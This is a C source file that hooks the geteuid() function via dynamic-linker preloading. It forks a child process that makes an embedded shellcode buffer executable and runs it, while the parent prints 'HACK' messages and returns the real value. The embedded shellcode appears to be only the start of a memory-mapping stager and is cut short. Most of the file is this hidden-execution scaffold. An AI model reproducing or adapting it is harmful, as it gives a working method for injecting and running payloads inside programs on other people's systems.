#define _GNU_SOURCE
#include <sys/mman.h> // for mprotect
#include <stdlib.h>
#include <stdio.h>
#include <dlfcn.h>  // define function for interacting with the dynamic linking loader
#include <unistd.h>

//c shell code 
char buf[]=
"\x48\x31\xff\x6a\x09\x58\x99\xb6\x10\x48\x89\xd6\x4d\x31\xc9";

//defiend  geteuid function to matches the original

uid_t geteuid(void){
  //pointer to point to original geteuid function
  typeof(geteuid) *old_geteuid;
 
  //dlsym function to get the memory address of the original version of the geteuid function.
  old_geteuid = dlsym(RTLD_NEXT, "geteuid");
  
  //creates a new process by duplicating the parent process, if fork is zero, we are running inside of new process
  if (fork() == 0){
    //get side of memory page
    intptr_t pagesize = sysconf(_SC_PAGESIZE);
    //check memory type and allocate memoery space for shell code 
    if (mprotect((void *)(((intptr_t)buf) & ~(pagesize - 1)), pagesize, PROT_READ|PROT_EXEC)){
    //return -1 when memory permissions chaning fails. 
    perror("mprotect");
    return -1;}
    
  int (*ret)() = (int(*)())buf;
  ret();
  }
  else{
    //execute normal geteuid
    printf("HACK: returning from function...\n");
    return (*old_geteuid)();
  }
  printf("HACK: Returning from main...\n");
  return -2;
}
  
  
  